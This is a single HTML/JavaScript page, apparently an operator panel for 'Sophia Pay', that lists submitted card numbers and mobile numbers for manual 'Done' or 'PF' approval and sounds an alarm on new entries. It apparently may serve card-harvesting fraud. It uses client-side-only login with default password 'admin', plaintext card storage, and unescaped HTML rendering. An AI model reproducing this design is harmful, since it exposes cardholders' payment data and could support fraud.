<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Sophia Pay — Admin Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }\n
  :root {
    --bg:       #07090f;
    --panel:    #0e1118;
    --surface:  rgba(255,255,255,0.04);
    --border:   rgba(255,255,255,0.08);
    --pink:     #f02d7d;
    --green:    #22d87a;
    --red:      #ff4d6d;
    --amber:    #f5a623;
    --text:     #e8eaf2;
    --muted:    rgba(232,234,242,0.42);
    --font:     'Syne', sans-serif;
    --mono:     'DM Mono', monospace;
  }

  body { font-family: var(--font); background: var(--bg); color: var(--text); padding: 40px 20px; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; }
  .admin-container { width: 100%; max-width: 1200px; display: grid; grid-template-columns: 1fr; gap: 30px; }
  @media (min-width: 900px) { .admin-container { grid-template-columns: 320px 1fr; } }

  .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 24px; display: flex; flex-direction: column; gap: 24px; height: fit-content; }
  .panel-title { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; display: flex; align-items: center; gap: 10px; }
  .panel-title span { color: var(--pink); }

  .nav-btn { display: flex; align-items: center; gap: 12px; padding: 14px 18px; background: transparent; border: 1px solid transparent; border-radius: 10px; color: var(--muted); font-family: var(--font); font-size: 15px; font-weight: 600; cursor: pointer; text-align: left; transition: all 0.2s ease; }
  .nav-btn:hover { background: var(--surface); color: var(--text); }
  .nav-btn.active { background: rgba(240,45,125,0.1); border-color: rgba(240,45,125,0.25); color: var(--pink); }

  .main-content { display: flex; flex-direction: column; gap: 24px; }
  .view-section { display: none; flex-direction: column; gap: 20px; }
  .view-section.active { display: flex; }

  .section-header { display: flex; justify-content: space-between; align-items: center; }
  .section-title { font-size: 24px; font-weight: 800; letter-spacing: -0.5px; }

  .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; }
  .stat-card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 8px; }
  .stat-label { font-size: 12px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; }
  .stat-value { font-size: 28px; font-weight: 700; font-family: var(--mono); }
  .stat-card.pending .stat-value { color: var(--amber); }
  .stat-card.success .stat-value { color: var(--green); }
  .stat-card.failed .stat-value { color: var(--red); }

  .list-container { display: flex; flex-direction: column; gap: 12px; }
  .req-card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 16px; justify-content: space-between; align-items: stretch; transition: border-color 0.2s ease; }
  @media (min-width: 600px) { .req-card { flex-direction: row; align-items: center; } }
  .req-card:hover { border-color: rgba(255,255,255,0.15); }
  
  .req-info { display: flex; flex-direction: column; gap: 6px; }
  .req-card-number { font-family: var(--mono); font-size: 18px; font-weight: 500; color: var(--text); letter-spacing: 0.5px; }
  .req-meta { display: flex; flex-wrap: wrap; gap: 16px; font-size: 13px; color: var(--muted); }
  .req-meta-item strong { color: var(--text); }

  .req-actions { display: flex; gap: 8px; }
  .req-actions button { font-family: var(--font); font-size: 13px; font-weight: 700; padding: 10px 16px; border: none; border-radius: 8px; cursor: pointer; transition: opacity 0.2s ease; }
  .req-actions button:hover { opacity: 0.85; }
  .btn-done { background: var(--green); color: #000; }
  .btn-pf { background: var(--red); color: #fff; }

  .table-wrapper { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
  table { width: 100%; border-collapse: collapse; text-align: left; font-size: 14px; }
  th, td { padding: 16px 20px; border-bottom: 1px solid var(--border); }
  th { background: rgba(255,255,255,0.02); font-weight: 600; color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
  tr:last-child td { border-bottom: none; }
  .td-num { font-family: var(--mono); font-weight: 500; }
  .badge { display: inline-block; padding: 4px 8px; border-radius: 6px; font-size: 12px; font-weight: 600; }
  .badge.processing { background: rgba(245,166,35,0.1); color: var(--amber); }
  .badge.success { background: rgba(34,216,122,0.1); color: var(--green); }
  .badge.failed { background: rgba(255,77,109,0.1); color: var(--red); }

  .empty-state { text-align: center; padding: 40px; color: var(--muted); background: var(--panel); border: 1px solid var(--border); border-radius: 12px; display: flex; flex-direction: column; align-items: center; gap: 12px; }
  .empty-state .icon { font-size: 32px; }

  .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px; width: 100%; max-width: 400px; }
  .form-group label { font-size: 13px; font-weight: 600; color: var(--muted); }
  .form-group input { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px; color: var(--text); font-family: var(--font); font-size: 15px; }
  .form-group input:focus { outline: none; border-color: var(--pink); }
  .btn-submit { background: var(--pink); color: #fff; border: none; border-radius: 8px; padding: 12px 24px; font-family: var(--font); font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 8px; }
  .form-message { margin-top: 12px; font-size: 14px; font-weight: 600; }
  .form-message.success { color: var(--green); }
  .form-message.error { color: var(--red); }

  .login-screen { position: fixed; inset: 0; background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
  .login-box { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 40px; width: 100%; max-width: 400px; text-align: center; display: flex; flex-direction: column; gap: 24px; }
</style>
</head>
<body>

<div id="loginScreen" class="login-screen">
  <div class="login-box">
    <div class="panel-title" style="justify-content: center;">⚡ Sophia Pay <span>Admin</span></div>
    <div style="display: flex; flex-direction: column; gap: 16px; text-align: left;">
      <div class="form-group" style="max-width: 100%;">
        <label>Password</label>
        <input type="password" id="loginPass" placeholder="Enter admin password" onkeydown="if(event.key==='Enter') attemptLogin()" />
      </div>
      <button class="btn-submit" onclick="attemptLogin()" style="width: 100%;">Access Panel</button>
      <div id="loginError" class="form-message error" style="text-align: center;"></div>
    </div>
  </div>
</div>

<div class="admin-container">
  <aside class="panel">
    <div class="panel-title">⚡ Sophia Pay <span>Admin</span></div>
    <nav style="display: flex; flex-direction: column; gap: 8px;">
      <button class="nav-btn active" onclick="switchView('live')" id="btn-live">⏳ Pending Requests</button>
      <button class="nav-btn" onclick="switchView('history')" id="btn-history">📜 Transaction History</button>
      <button class="nav-btn" onclick="switchView('settings')" id="btn-settings">⚙️ Settings</button>
    </nav>
  </aside>

  <main class="main-content">
    <section id="view-live" class="view-section active">
      <div class="section-header">
        <h2 class="section-title">Pending Requests</h2>
      </div>
      <div class="stats-grid">
        <div class="stat-card pending"><div class="stat-label">Pending</div><div class="stat-value" id="stat-pending">0</div></div>
        <div class="stat-card success"><div class="stat-label">Approved</div><div class="stat-value" id="stat-approved">0</div></div>
        <div class="stat-card failed"><div class="stat-label">Declined</div><div class="stat-value" id="stat-declined">0</div></div>
      </div>
      <div class="list-container" id="pendingList"></div>
    </section>

    <section id="view-history" class="view-section">
      <div class="section-header">
        <h2 class="section-title">Transaction History</h2>
      </div>
      <div class="table-wrapper">
        <table>
          <thead>
            <tr>
              <th>Time</th>
              <th>Card Details</th>
              <th>Mobile</th>
              <th>Amount</th>
              <th>Status</th>
            </tr>
          </thead>
          <tbody id="historyTableBody"></tbody>
        </table>
      </div>
    </section>

    <section id="view-settings" class="view-section">
      <div class="section-header">
        <h2 class="section-title">Admin Settings</h2>
      </div>
      <div class="panel" style="background: var(--panel);">
        <h3 style="font-size: 16px; font-weight: 700;">Change Admin Password</h3>
        <div style="display: flex; flex-direction: column; gap: 4px;">
          <div class="form-group"><label>Current Password</label><input type="password" id="currentPass" /></div>
          <div class="form-group"><label>New Password</label><input type="password" id="newPass" /></div>
          <div class="form-group"><label>Confirm New Password</label><input type="password" id="confirmPass" /></div>
          <button class="btn-submit" onclick="updatePassword()">Update Password</button>
          <div id="passMessage"></div>
        </div>
      </div>
    </main>
</div>

<script>
  const STORAGE_KEY = 'sophia_pay_txns';
  const PASSWORD_KEY = 'sophia_pay_admin_pass';
  const DEFAULT_PASSWORD = 'admin';

  // ── [পরিবর্তন - ১] অ্যালার্ম সাউন্ড এবং কাউন্টার ট্র্যাক করার জন্য ভেরিয়েবল ──
  const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-84.wav'); 
  let lastPendingCount = 0;

  function getAll() {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
  }

  function saveAll(txns) {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(txns));
    updateStats();
  }

  function attemptLogin() {
    const entered = document.getElementById('loginPass').value;
    const stored = localStorage.getItem(PASSWORD_KEY) || DEFAULT_PASSWORD;
    if (entered === stored) {
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('loginPass').value = '';
    } else {
      document.getElementById('loginError').innerText = 'Invalid password';
    }
  }

  function switchView(viewName) {
    document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    document.getElementById(`view-${viewName}`).classList.add('active');
    document.getElementById(`btn-${viewName}`).classList.add('active');

    if (viewName === 'history') renderHistory(getAll());
  }

  function updateStats() {
    const all = getAll();
    document.getElementById('stat-pending').innerText  = all.filter(r => r.status === 'processing').length;
    document.getElementById('stat-approved').innerText = all.filter(r => r.status === 'success').length;
    document.getElementById('stat-declined').innerText = all.filter(r => r.status === 'failed').length;
  }

  // ── [পরিবর্তন - ২] ডাটা আসার পর অটোমেটিক অ্যালার্ম বাজার লজিক সহ রেন্ডার ফাংশন ──
  function renderPending(requests) {
    const list = document.getElementById('pendingList');
    const pending = requests.filter(r => r.status === 'processing');

    // যদি আগের চেয়ে নতুন পেন্ডিং ডাটা বৃদ্ধি পায়, তবেই অ্যালার্ম বাজবে
    if (pending.length > lastPendingCount) {
      alarmSound.play().catch(e => console.log("ব্রাউজার দ্বারা অডিও ব্লকড। পেজের যেকোনো স্থানে একটি ক্লিক করুন।"));
    }
    lastPendingCount = pending.length; 

    if (!pending.length) {
      list.innerHTML = '<div class="empty-state"><div class="icon">🎉</div>No pending requests right now</div>';
      return;
    }

    list.innerHTML = pending.map(r => `
      <div class="req-card">
        <div class="req-info">
          <div class="req-card-number">${r.cardNumber || 'N/A'}</div>
          <div class="req-meta">
            <div class="req-meta-item">📱 <strong>${r.mobile || 'N/A'}</strong></div>
            <div class="req-meta-item">💰 <strong>$${parseFloat(r.amount || 0).toFixed(2)}</strong></div>
            <div class="req-meta-item">🕐 ${formatTime(r.createdAt)}</div>
          </div>
        </div>
        <div class="req-actions">
          <button class="btn-done" onclick="approve('${r.id}')">✓ Done</button>
          <button class="btn-pf" onclick="decline('${r.id}')">✗ PF</button>
        </div>
      </div>
    `).join('');
  }

  function renderHistory(requests) {
    const tbody = document.getElementById('historyTableBody');
    const sorted = [...requests].sort((a,b) => new Date(b.createdAt) - new Date(a.createdAt));

    if (!sorted.length) {
      tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--muted)">No transactions recorded yet</td></tr>';
      return;
    }

    tbody.innerHTML = sorted.map(r => `
      <tr>
        <td style="color:var(--muted)">${formatTime(r.createdAt)}</td>
        <td class="td-num">${r.cardNumber || 'N/A'}</td>
        <td>${r.mobile || 'N/A'}</td>
        <td class="td-num" style="font-weight:600">$${parseFloat(r.amount || 0).toFixed(2)}</td>
        <td><span class="badge ${r.status}">${statusLabel(r.status)}</span></td>
      </tr>
    `).join('');
  }

  function approve(id) {
    const all = getAll();
    const idx = all.findIndex(r => r.id === id);
    if (idx !== -1) {
      all[idx].status = 'success';
      saveAll(all);
      renderPending(all);
    }
  }

  function decline(id) {
    const all = getAll();
    const idx = all.findIndex(r => r.id === id);
    if (idx !== -1) {
      all[idx].status = 'failed';
      saveAll(all);
      renderPending(all);
    }
  }

  function updatePassword() {
    const current = document.getElementById('currentPass').value;
    const newPass = document.getElementById('newPass').value;
    const confirm = document.getElementById('confirmPass').value;
    const msg = document.getElementById('passMessage');

    const stored = localStorage.getItem(PASSWORD_KEY) || DEFAULT_PASSWORD;

    if (current !== stored) {
      msg.innerHTML = '<div class="form-message error">Current password is incorrect</div>';
      return;
    }

    if (!newPass || newPass.length < 4) {
      msg.innerHTML = '<div class="form-message error">New password must be at least 4 characters</div>';
      return;
    }

    if (newPass !== confirm) {
      msg.innerHTML = '<div class="form-message error">Passwords do not match</div>';
      return;
    }

    localStorage.setItem(PASSWORD_KEY, newPass);
    msg.innerHTML = '<div class="form-message success">Password updated successfully!</div>';
    
    document.getElementById('currentPass').value = '';
    document.getElementById('newPass').value = '';
    document.getElementById('confirmPass').value = '';

    setTimeout(() => {
      msg.innerHTML = '';
    }, 3000);
  }

  function formatTime(iso) {
    return new Date(iso).toLocaleString();
  }

  function statusLabel(status) {
    const map = { processing: '⏳ Processing', success: '✅ Success', failed: '❌ Failed' };
    return map[status] || status;
  }

  // ইভেন্ট লুপ রান রাখা
  updateStats();
  renderPending(getAll());
  setInterval(() => {
    const currentData = getAll();
    updateStats();
    // শুধুমাত্র লাইভ ভিউ সেকশন ওপেন থাকলে ফ্রন্ট-এন্ড রি-রেন্ডার হবে
    if (document.getElementById('view-live').classList.contains('active')) {
      renderPending(currentData);
    }
  }, 2000);
</script>
</body>
</html>
